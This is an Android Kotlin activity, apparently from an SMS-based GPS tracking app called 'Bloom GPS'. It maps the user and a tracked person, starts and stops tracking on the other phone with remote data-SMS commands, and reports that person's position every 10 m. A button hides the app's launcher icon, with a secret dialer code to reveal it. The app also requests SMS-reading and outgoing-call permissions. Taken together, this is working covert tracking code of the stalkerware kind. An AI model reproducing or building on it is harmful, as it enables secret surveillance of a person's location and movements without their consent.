package com.bloom.gps

import android.Manifest
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.telephony.SmsManager
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.preference.PreferenceManager
import org.osmdroid.config.Configuration
import org.osmdroid.tileprovider.tilesource.TileSourceFactory
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import kotlin.math.roundToInt

class MainActivity : AppCompatActivity(), LocationListener {

    private lateinit var mapView: MapView
    private lateinit var tvStatut: TextView
    private lateinit var tvMoi: TextView
    private lateinit var tvLui: TextView
    private lateinit var tvVitesseLui: TextView
    private lateinit var tvDistance: TextView
    private lateinit var etMonNumero: EditText
    private lateinit var etAutreNumero: EditText
    private lateinit var btnPermissions: Button
    private lateinit var btnStart: Button
    private lateinit var btnStop: Button
    private lateinit var btnHideApp: ImageButton

    private var marqueurMoi: Marker? = null
    private var marqueurLui: Marker? = null
    private lateinit var locationManager: LocationManager

    private val PERMISSIONS_REQUEST = 1001
    private var suiviActif = false
    private var dernierePosition: Location? = null
    private var derniereDistanceEnvoi = 0f
    private var derniereVitesseLui = 0.0

    private val demarrerSuiviReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            suiviActif = true
            PreferenceManager.getDefaultSharedPreferences(this@MainActivity)
                .edit().putBoolean("SUIVI_ACTIF", true).apply()
            derniereDistanceEnvoi = 0f
            dernierePosition = null
            mettreAJourBoutons()
            tvStatut.text = "🟢 SUIVI ACTIF — Envoi toutes les 10m"
            demarrerGPS()
        }
    }

    private val arreterSuiviReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            suiviActif = false
            PreferenceManager.getDefaultSharedPreferences(this@MainActivity)
                .edit().putBoolean("SUIVI_ACTIF", false).apply()
            derniereDistanceEnvoi = 0f
            dernierePosition = null
            derniereVitesseLui = 0.0
            mettreAJourBoutons()
            tvStatut.text = "🔴 SUIVI ARRÊTÉ"
            tvDistance.text = "📡 Dernier envoi: —"
            tvVitesseLui.text = "⚡ VITESSE LUI: — km/h"
        }
    }

    private val maPositionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val lat = intent?.getDoubleExtra("latitude", 0.0) ?: 0.0
            val lon = intent?.getDoubleExtra("longitude", 0.0) ?: 0.0
            if (lat != 0.0 && lon != 0.0) mettreAJourMoi(lat, lon)
        }
    }

    // ✅ RECEVOIR POSITION + VITESSE DE L'AUTRE
    private val autrePositionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val lat = intent?.getDoubleExtra("latitude", 0.0) ?: 0.0
            val lon = intent?.getDoubleExtra("longitude", 0.0) ?: 0.0
            val vitesse = intent?.getDoubleExtra("vitesse", 0.0) ?: 0.0
            if (lat != 0.0 && lon != 0.0) {
                mettreAJourLui(lat, lon)
                mettreAJourVitesseLui(vitesse)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Configuration.getInstance().load(
            applicationContext,
            PreferenceManager.getDefaultSharedPreferences(applicationContext)
        )

        setContentView(R.layout.activity_main)
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

        initialiserVues()
        chargerNumeros()
        configurerCarte()
        configurerBoutons()
        enregistrerReceveurs()
        verifierPermissions()
    }

    private fun initialiserVues() {
        mapView = findViewById(R.id.mapView)
        tvStatut = findViewById(R.id.tvStatut)
        tvMoi = findViewById(R.id.tvMoi)
        tvLui = findViewById(R.id.tvLui)
        tvVitesseLui = findViewById(R.id.tvVitesseLui)
        tvDistance = findViewById(R.id.tvDistance)
        etMonNumero = findViewById(R.id.etMonNumero)
        etAutreNumero = findViewById(R.id.etAutreNumero)
        btnPermissions = findViewById(R.id.btnPermissions)
        btnStart = findViewById(R.id.btnStart)
        btnStop = findViewById(R.id.btnStop)
        btnHideApp = findViewById(R.id.btnHideApp)
    }

    private fun chargerNumeros() {
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        etMonNumero.setText(prefs.getString("MON_NUM", ""))
        etAutreNumero.setText(prefs.getString("AUTRE_NUM", ""))
        mettreAJourBoutons()
    }

    private fun sauvegarderNumeros() {
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        prefs.edit().putString("MON_NUM", etMonNumero.text.toString().trim()).apply()
        prefs.edit().putString("AUTRE_NUM", etAutreNumero.text.toString().trim()).apply()
    }

    private fun configurerCarte() {
        mapView.setTileSource(TileSourceFactory.MAPNIK)
        mapView.setMultiTouchControls(true)
        mapView.controller.setZoom(15.0)
        mapView.controller.setCenter(GeoPoint(47.4784, -0.5632))
        tvStatut.text = "✅ Prêt — entrez les numéros"
    }

    private fun demarrerGPS() {
        if (ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) return

        locationManager.requestLocationUpdates(
            LocationManager.GPS_PROVIDER, 1000, 1f, this
        )
        locationManager.requestLocationUpdates(
            LocationManager.NETWORK_PROVIDER, 1000, 1f, this
        )
    }

    override fun onLocationChanged(nouvellePosition: Location) {
        mettreAJourMoi(nouvellePosition.latitude, nouvellePosition.longitude)

        if (suiviActif && dernierePosition != null) {
            val distance = nouvellePosition.distanceTo(dernierePosition!!)
            derniereDistanceEnvoi += distance

            tvDistance.text = "📡 Déplacement: ${derniereDistanceEnvoi.roundToInt()}m / 10m"

            if (derniereDistanceEnvoi >= 10f) {
                envoyerPositionSuiviContinu(nouvellePosition)
                derniereDistanceEnvoi = 0f
            }
        } else if (dernierePosition == null) {
            derniereDistanceEnvoi = 0f
        }

        dernierePosition = nouvellePosition
    }

    private fun mettreAJourVitesseLui(vitesse: Double) {
        derniereVitesseLui = vitesse
        val texte = when {
            vitesse < 1.0 -> "⚡ VITESSE LUI: À L'ARRÊT"
            vitesse < 5.0 -> "🚶 MARCHE: ${String.format("%.1f", vitesse)} km/h"
            vitesse < 25.0 -> "🏃 COURSE/VÉLO: ${String.format("%.1f", vitesse)} km/h"
            vitesse < 60.0 -> "🚗 VOITURE: ${String.format("%.1f", vitesse)} km/h"
            else -> "🚨 RAPIDE: ${String.format("%.1f", vitesse)} km/h"
        }
        tvVitesseLui.text = texte
    }

    private fun configurerBoutons() {
        btnPermissions.setOnClickListener { demanderPermissions() }

        btnHideApp.setOnClickListener {
            sauvegarderNumeros()

            val pm = packageManager
            pm.setComponentEnabledSetting(
                ComponentName(this, "com.bloom.gps.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            Toast.makeText(this, "🕵️ CACHER !\n📞 Révéler : composez *#2566#", Toast.LENGTH_LONG).show()
            finish()
            moveTaskToBack(true)
        }

        btnStart.setOnClickListener {
            val num = etAutreNumero.text.toString().trim()
            if (num.isEmpty()) {
                Toast.makeText(this, "⚠️ Entrez le numéro !", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            sauvegarderNumeros()

            try {
                SmsManager.getDefault().sendDataMessage(
                    num, null, 10001.toShort(),
                    "BLOOM_START".toByteArray(Charsets.UTF_8),
                    null, null
                )
                Toast.makeText(this, "🟢 DÉMARRAGE ENVOYÉ !", Toast.LENGTH_SHORT).show()
                tvStatut.text = "✅ Commande START envoyée"
            } catch (e: Exception) {
                Toast.makeText(this, "❌ Erreur: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }

        btnStop.setOnClickListener {
            val num = etAutreNumero.text.toString().trim()
            if (num.isEmpty()) {
                Toast.makeText(this, "⚠️ Entrez le numéro !", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            sauvegarderNumeros()

            try {
                SmsManager.getDefault().sendDataMessage(
                    num, null, 10001.toShort(),
                    "BLOOM_STOP".toByteArray(Charsets.UTF_8),
                    null, null
                )
                Toast.makeText(this, "🔴 ARRÊT ENVOYÉ !", Toast.LENGTH_SHORT).show()
                tvStatut.text = "✅ Commande STOP envoyée"
                tvDistance.text = "📡 Dernier envoi: —"
                tvVitesseLui.text = "⚡ VITESSE LUI: — km/h"
            } catch (e: Exception) {
                Toast.makeText(this, "❌ Erreur: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun envoyerPositionSuiviContinu(pos: Location) {
        val num = etAutreNumero.text.toString().trim()
        if (num.isEmpty()) return

        val message = "BLOOM_POS:${pos.latitude}:${pos.longitude}"
        try {
            SmsManager.getDefault().sendDataMessage(
                num, null, 10001.toShort(),
                message.toByteArray(Charsets.UTF_8),
                null, null
            )
            tvDistance.text = "✅ ENVOYÉ ! Déplacement: ~10m"
        } catch (e: Exception) {
            tvDistance.text = "❌ Erreur envoi: ${e.message}"
        }
    }

    private fun mettreAJourBoutons() {
        if (suiviActif) {
            btnStart.isEnabled = false
            btnStart.setBackgroundColor(Color.parseColor("#9CA3AF"))
        } else {
            btnStart.isEnabled = true
            btnStart.setBackgroundColor(Color.parseColor("#10B981"))
        }
    }

    private fun enregistrerReceveurs() {
        registerReceiver(demarrerSuiviReceiver, IntentFilter("com.bloom.gps.DEMARRER_SUIVI"), RECEIVER_NOT_EXPORTED)
        registerReceiver(arreterSuiviReceiver, IntentFilter("com.bloom.gps.ARRETER_SUIVI"), RECEIVER_NOT_EXPORTED)
        registerReceiver(maPositionReceiver, IntentFilter("com.bloom.gps.MA_POSITION"), RECEIVER_NOT_EXPORTED)
        registerReceiver(autrePositionReceiver, IntentFilter("com.bloom.gps.AUTRE_POSITION"), RECEIVER_NOT_EXPORTED)
    }

    private fun verifierPermissions() {
        val a = ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
        val b = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
        val c = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
        val d = ActivityCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS)
        if (a == PackageManager.PERMISSION_GRANTED && b == PackageManager.PERMISSION_GRANTED && 
            c == PackageManager.PERMISSION_GRANTED && d == PackageManager.PERMISSION_GRANTED) {
            tvStatut.text = "✅ Prêt ! Entrez les numéros"
            btnPermissions.text = "✅ OK"
            btnPermissions.isEnabled = false
            demarrerGPS()
        }
    }

    private fun demanderPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.PROCESS_OUTGOING_CALLS
            ),
            PERMISSIONS_REQUEST
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            tvStatut.text = "✅ TOUT EST PRÊT !"
            btnPermissions.text = "✅ OK"
            btnPermissions.isEnabled = false
            Toast.makeText(this, "🎉 Permissions accordées !", Toast.LENGTH_SHORT).show()
            demarrerGPS()
        } else {
            tvStatut.text = "❌ Permissions refusées"
            Toast.makeText(this, "⚠️ Accordez toutes les permissions", Toast.LENGTH_LONG).show()
        }
    }

    private fun mettreAJourMoi(lat: Double, lon: Double) {
        val point = GeoPoint(lat, lon)
        if (marqueurMoi == null) {
            marqueurMoi = Marker(mapView).apply {
                position = point
                title = "📍 MOI"
                setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
                icon = getDrawable(android.R.drawable.ic_menu_myplaces)
            }
            mapView.overlays.add(marqueurMoi)
        } else {
            marqueurMoi!!.position = point
        }
        tvMoi.text = "🔵 MOI: ${String.format("%.6f", lat)}, ${String.format("%.6f", lon)}"
        mapView.controller.setCenter(point)
        mapView.invalidate()
    }

    private fun mettreAJourLui(lat: Double, lon: Double) {
        val point = GeoPoint(lat, lon)
        if (marqueurLui == null) {
            marqueurLui = Marker(mapView).apply {
                position = point
                title = "📍 LUI"
                setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
                icon = getDrawable(android.R.drawable.ic_menu_mylocation)
            }
            mapView.overlays.add(marqueurLui)
        } else {
            marqueurLui!!.position = point
        }
        tvLui.text = "🔴 LUI: ${String.format("%.6f", lat)}, ${String.format("%.6f", lon)}"
        tvStatut.text = "✅ Position mise à jour !"
        mapView.invalidate()
    }

    override fun onResume() { super.onResume(); mapView.onResume() }
    override fun onPause() { super.onPause(); mapView.onPause() }
    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(demarrerSuiviReceiver)
        unregisterReceiver(arreterSuiviReceiver)
        unregisterReceiver(maPositionReceiver)
        unregisterReceiver(autrePositionReceiver)
        locationManager.removeUpdates(this)
    }

    override fun onStatusChanged(p0: String?, p1: Int, p2: Bundle?) {}
    override fun onProviderEnabled(p0: String) {}
    override fun onProviderDisabled(p0: String) {}
}
